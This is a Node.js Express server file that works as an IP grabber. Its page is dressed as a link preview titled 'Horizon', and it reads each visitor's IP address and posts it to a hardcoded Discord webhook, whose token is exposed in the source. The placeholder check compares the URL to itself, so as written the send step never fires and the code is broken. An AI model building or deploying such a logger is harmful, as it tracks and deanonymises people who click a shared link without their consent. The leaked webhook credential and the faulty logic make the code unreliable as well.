import express from 'express';
import fetch from 'node-fetch';

const app = express();
const port = process.env.PORT || 3000;
const webhookUrl = "https://discordapp.com/api/webhooks/1368358386571280435/kLO9BC2RFtV8M0lkCz57upHFFgcmDlllpn8OUM-jnFLOT9OZPi31SafXHikeg5yTGYnn";

app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (webhookUrl && webhookUrl !== "https://discordapp.com/api/webhooks/1368358386571280435/kLO9BC2RFtV8M0lkCz57upHFFgcmDlllpn8OUM-jnFLOT9OZPi31SafXHikeg5yTGYnn") {
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `IP Address Visited: ${ip}`
        }),
      });
      console.log(`Sent IP ${ip} to webhook`);
    } catch (error) {
      console.error('Error sending IP to webhook:', error);
    }
  } else {
    console.warn('Webhook URL not set or is the placeholder. IP not sent.');
  }

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Horizon</title>
        <meta name="description" content="embed preview">
    </head>
    <body>
        <h1>Welcome to Horizon</h1>
        <p>Your IP has been logged.</p>
    </body>
    </html>
  `);
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
